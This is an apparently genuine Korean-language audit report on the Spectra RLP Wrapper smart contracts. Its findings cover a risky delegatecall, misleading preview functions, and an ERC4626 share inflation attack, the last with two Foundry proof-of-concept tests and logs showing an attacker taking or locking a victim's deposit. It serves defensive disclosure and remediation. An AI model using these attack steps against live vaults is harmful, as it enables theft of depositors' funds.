# 소개

Pashov Audit Group은 업계 최고의 스마트 컨트랙트 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 1000건 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만드는 것을 목표로 합니다. 100% 보안은 결코 보장될 수 없지만, 경험 많은 연구원들이 귀하의 블록체인 프로토콜을 위해 최선을 다할 것을 보장합니다. [여기](https://github.com/pashov/audits)에서 이전 작업을 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 문의하십시오.

# 면책 조항

스마트 컨트랙트 보안 검토는 취약점의 완전한 부재를 검증할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로, 우리는 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장할 수 없으며, 검토가 스마트 컨트랙트의 문제를 발견할 것이라고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 서론

**perspectivefi/RLP-Wrapper** 저장소에 대한 시간 제한이 있는 보안 검토가 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 컨트랙트 구현의 보안 측면에 중점을 두었습니다.

# Spectra RLP Wrapper 소개

Spectra는 이자 발생 토큰(Interest Bearing Token, IBT)에서 생성된 원금과 수익을 분리합니다. 이를 통해 사용자는 기초 자산과 수익을 독립적으로 관리할 수 있습니다. 이 감사는 Resolv Protocol RLP Wrapper에 중점을 두었습니다. 이는 ERC4626 인터페이스를 통해 RLP 볼트와 상호 작용할 수 있도록 하여 Principal Token 컨트랙트와의 호환성을 용이하게 합니다. Spectra4626Wrapper를 기반으로 구축되어 지분 대 자산(share-to-asset) 변환을 처리하고 Resolv의 입금 시스템과 통합됩니다.

# 리스크 분류

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 | 높음 | 중간 |
| **가능성: 중간** | 높음 | 중간 | 낮음 |
| **가능성: 낮음** | 중간 | 낮음 | 낮음 |

## 영향 (Impact)

- 높음 - 프로토콜 자산의 상당한 물질적 손실을 초래하거나 사용자 그룹에 심각한 피해를 줍니다.

- 중간 - 프로토콜 자산의 적당한 물질적 손실을 초래하거나 사용자 그룹에 적당한 피해를 줍니다.

- 낮음 - 프로토콜 자산의 경미한 물질적 손실을 초래하거나 소수의 사용자 그룹에 피해를 줍니다.

## 가능성 (Likelihood)

- 높음 - 온체인 조건을 모방한 합리적인 가정하에 공격 경로가 가능하며, 훔치거나 잃을 수 있는 자금의 양에 비해 공격 비용이 상대적으로 낮습니다.

- 중간 - 조건부로 인센티브가 있는 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.

- 낮음 - 가정이 너무 많거나 너무 비현실적이거나, 공격자가 인센티브가 거의 없거나 전혀 없는 상태에서 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치

- 치명적 (Critical) - 가능한 한 빨리 수정해야 합니다 (이미 배포된 경우).

- 높음 (High) - 수정해야 합니다 (배포 전이라면 배포 전에).

- 중간 (Medium) - 수정하는 것이 좋습니다.

- 낮음 (Low) - 수정할 수 있습니다.

# 보안 평가 요약

_검토 커밋 해시_ - [3d991b469930a82aeb286c35bc6b5a5d6b1f61bc](https://github.com/perspectivefi/RLP-Wrapper/tree/3d991b469930a82aeb286c35bc6b5a5d6b1f61bc)

_수정 검토 커밋 해시_ - [7d61a80a5df523ce9bb5e532dbe10f5b4bf48687](https://github.com/perspectivefi/RLP-Wrapper/tree/7d61a80a5df523ce9bb5e532dbe10f5b4bf48687)

### 범위

다음 스마트 컨트랙트들이 감사 범위에 포함되었습니다:

- `SpectraWrappedRLP`
- `Spectra4626Wrapper`

# 발견 사항

# [L-01] 위험한 `claimRewards()` 함수

`claimRewards()` 함수의 주된 목적은 누적된 [Points](https://resolv.xyz/points) 수에 따라 RLP 보유자가 사용할 수 있게 될 Resolve 보상을 청구할 잠재적 능력을 위해 `Spectra4626Wrapper` 컨트랙트를 준비하는 것입니다.

그러나 Resolv 프로토콜에서 향후 Resolve 보상 청구 메커니즘을 아직 출시하지 않았기 때문에 현재 `claimRewards()` 함수 구현은 불필요한 중앙 집중화 위험과 추가적인 실패 지점을 초래합니다.

문제는 `claimRewards()`가 `.delegatecall`을 사용하여 아직 알려지지 않은 `RewardsProxy` 컨트랙트 구현과 상호 작용한다는 것인데, 이 컨트랙트는 Resolv 프로토콜 보상 청구 메커니즘을 포함하도록 의도된 것입니다.

```solidity
        bytes memory data2 = abi.encodeCall(IRewardsProxy(address(0)).claimRewards, (data));
        (bool success, ) = _rewardsProxy.delegatecall(data2);
```

악의적이거나 침해당한 `RewardsProxy`가 사용되면 임의의 코드를 실행하고 `SpectraWrappedRLP` 컨트랙트에서 자금을 빼낼 수 있습니다.

`SpectraWrappedRLP` 컨트랙트는 이미 업그레이드 가능하므로 Resolve 프로토콜이 사양을 발표하면 필요한 보상 청구 메커니즘을 수용하도록 구현을 향후 업데이트할 수 있습니다. 따라서 현재 형태의 `claimRewards()` 함수는 중복되며 피할 수 있는 위험을 초래합니다.

따라서 Resolv 프로토콜이 보상 청구 메커니즘을 확정하고 발표할 때까지 `claimRewards()` 함수를 완전히 제거하는 것이 좋습니다. 이렇게 하면 불필요한 중앙 집중화 위험이 제거됩니다. 메커니즘을 사용할 수 있게 되면 `SpectraWrappedRLP` 컨트랙트를 업그레이드하여 보상 청구를 위한 안전하고 구체적인 솔루션을 구현할 수 있습니다.

# [L-02] 오해의 소지가 있는 preview 함수들

`previewDeposit`, `previewMint`, `previewWithdraw`, `previewRedeem`은 모두 USDC 대 지분(shares) 변환 또는 그 반대를 처리합니다. 반환된 값이 `wrap` 및 `unwrap`과 함께 사용되면 사용자가 오해할 수 있습니다. `previewWrap` 및 `previewUnwrap`을 이미 사용할 수 있으므로 이러한 함수를 비활성화하는 것을 고려하십시오.

# [L-03] 인플레이션 공격

`SpectraWrappedRLP`는 구현의 기반으로 OZ `ERC4626Upgradeable`을 사용하지만 기본 `1 virtual share` 및 `1 virtual asset`을 사용하는 것만으로는 인플레이션 공격을 방지하기에 충분하지 않습니다.

코드는 또한 `balanceOf(address(this))`를 사용하여 `vaultShare` 잔고를 검색하므로 기부(donation)가 가능합니다.

이 공격은 아래에 설명된 대로 공격자에게 수익성이 있을 수 있습니다:

1. 처음에 풀에는 0개의 지분과 0개의 자산이 있습니다.
2. 공격자는 1000 wei 지분을 민팅합니다.
3. 공격자는 볼트에 1000 RLP를 기부합니다.
4. 이제 주가가 부풀려졌습니다. 약 1 RLP의 비용으로 공격자는 다른 사용자의 지분 예치금 계산에서 발생하는 반올림 오류로부터 이익을 얻을 수 있습니다. 이익은 사용자 예치금에서 `amount % 1 RLP`로 추정할 수 있습니다.

**첫 번째 테스트 예시:**

```solidity
    function test_inflation_attack() public virtual {
        address user = address(0x123);
        address victim = address(0x124);
        
        _ibt_deposit(user, 1000e18 + 1000);
        _ibt_deposit(victim, 40e18);
        
        _approve(_vaultShare_, user, _wrapper_, 1000);
        _approve(_vaultShare_, victim, _wrapper_, 40e18);

        vm.startPrank(user);
        // mint 1000 shares
        ISpectra4626Wrapper(_wrapper_).wrap(1000, user);
        // donate 1000 RLP
        IERC20(_vaultShare_).transfer(_wrapper_, 1000e18);

        vm.startPrank(victim);
        ISpectra4626Wrapper(_wrapper_).wrap(199e17, victim);
        
        // attacker almost even after first deposit
        uint256 attackerBalance = ISpectra4626Wrapper(_wrapper_).balanceOf(user);
        console.log("Attacker balance: %d, ~999.9 RLP", ISpectra4626Wrapper(_wrapper_).previewUnwrap(attackerBalance));

        ISpectra4626Wrapper(_wrapper_).wrap(199e17, victim);

        // attacker in profit after second deposit
        attackerBalance = ISpectra4626Wrapper(_wrapper_).balanceOf(user);
        console.log("Attacker balance: %d, ~1000.7 RLP", ISpectra4626Wrapper(_wrapper_).previewUnwrap(attackerBalance));
        
        // victim is in loss
        uint256 victimBalance = ISpectra4626Wrapper(_wrapper_).balanceOf(victim);
        console.log("Victim balance: %d, ~38.02 RLP", ISpectra4626Wrapper(_wrapper_).previewUnwrap(victimBalance));
    }
```

```text
[PASS] test_inflation_attack() (gas: 782938)
Logs:
  Attacker balance: 999901960784313726471, ~999.9 RLP
  Attacker balance: 1000769971126082772859, ~1000.7 RLP
  Victim balance: 38029258902791145368, ~38.02 RLP
```

테스트에서 알 수 있듯이 공격자는 다른 사용자의 예치금 일부를 훔쳐 축적할 수 있습니다.

**두 번째 테스트 예시:**

`SpectraWrappedRLPTest.t.sol`에 다음 테스트를 추가하십시오:

```solidity
    function test_initial_deposit_grief() public virtual {
        
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        _ibt_deposit(alice,11e18 + 10);
        uint256 initialAssetBalance = IERC20(_vaultShare_).balanceOf(alice);
        console.log("attacker balance before : ");
        console.log(initialAssetBalance);
        _approve(_vaultShare_, alice, _wrapper_, 1e18);

        vm.startPrank(alice);
        ISpectra4626Wrapper(_wrapper_).wrap(10, alice);
        // donate
        IERC20(_vaultShare_).transfer(_wrapper_, 11e18);
        vm.stopPrank();

        _ibt_deposit(bob,1e18);
        _approve(_vaultShare_,bob, _wrapper_, 1e18);
        vm.startPrank(bob);
        ISpectra4626Wrapper(_wrapper_).wrap(1e18, bob);

        uint256 bobShares = IERC20(_wrapper_).balanceOf(bob);
        console.log("bob shares : ");
        console.log(bobShares);
        vm.stopPrank();

        vm.startPrank(alice);
        ISpectra4626Wrapper(_wrapper_).unwrap(10, alice, alice);
        uint256 afterAssetBalance = IERC20(_vaultShare_).balanceOf(alice);
        console.log("attacker balance after : ");
        console.log(afterAssetBalance);
    }
```

테스트 실행:

```shell
forge test --match-test test_initial_deposit_grief -vvv
```

로그:

```shell
Logs:
  attacker balance before : 
  11000000000000000010
  bob shares : 
  0
  attacker balance after : 
  10909090909090909100
```

Alice가 ~0.1 RLP의 비용으로 Bob의 자산 1 RLP를 잠글 수 있음을 알 수 있습니다. 배포 중에 소량을 초기 랩(wrap)하여 이를 완화하는 것을 고려하십시오.

**권장 사항:**

인플레이션 공격을 방지하는 몇 가지 방법이 있습니다:

- 가장 효과적이고 신뢰할 수 있는 솔루션은 프로토콜이 소액의 초기 예금을 수행하고 받은 지분을 태우는(burn) 것입니다.

기타 잠재적 솔루션:

1. `_decimalsOffset()`을 6과 같이 더 큰 값으로 늘립니다.
2. 더 많은 가상 지분(예: 1000)을 사용합니다.
3. 예치된 자산에 대한 내부 회계를 구현합니다.
